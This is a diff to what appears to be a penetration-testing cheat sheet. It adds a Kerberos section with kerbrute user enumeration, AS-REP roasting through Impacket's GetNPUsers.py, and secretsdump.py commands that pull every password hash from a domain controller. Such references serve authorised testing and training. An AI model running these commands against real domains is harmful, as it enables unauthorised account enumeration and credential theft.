@@ -31,7 +31,12 @@ cadaver [IP_ADDR]
 ```
 
 ### Kerberos (88)
-
+```
+kerbrute userenum --dc [DOMAIN] -d [DOMAIN] [WORDLIST]    # enum user
+GetNPUsers.py [DOMAIN]/[USERNAME] -request -no-pass -dc-ip [IP_ADDR]    # get user that does not require kerberos preauth
+secretsdump.py -dc-ip [IP_ADDR] [DOMAIN].local/[USERNAME]:[PASSWORD]@[IP_ADDR]    # retrieve all of the password hashes
+```
+Ref: https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py
 
 ### Network File System (111 & 2049)
 ```
